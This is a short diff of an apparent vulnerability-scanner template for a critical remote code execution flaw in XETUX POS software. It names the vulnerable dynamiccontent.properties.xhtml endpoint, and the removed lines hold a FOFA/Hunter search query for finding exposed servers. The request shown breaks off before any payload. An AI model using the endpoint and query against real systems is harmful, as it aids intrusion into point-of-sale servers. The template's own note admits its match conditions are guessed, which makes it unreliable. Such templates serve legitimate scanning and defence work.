@@ -3,14 +3,8 @@ info:
   name: XETUX软件dynamiccontent.properties.xhtml远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/9e15b8d983a045615f1f8b7e37870f68
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 9e15b8d983a045615f1f8b7e37870f68
-    fofa: + hunter`web.title="@XETUX"&&web.title="XPOS"&&web.body="BackEnd"`
 http:
 - raw:
   - 'POST /xc-one-pos/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1
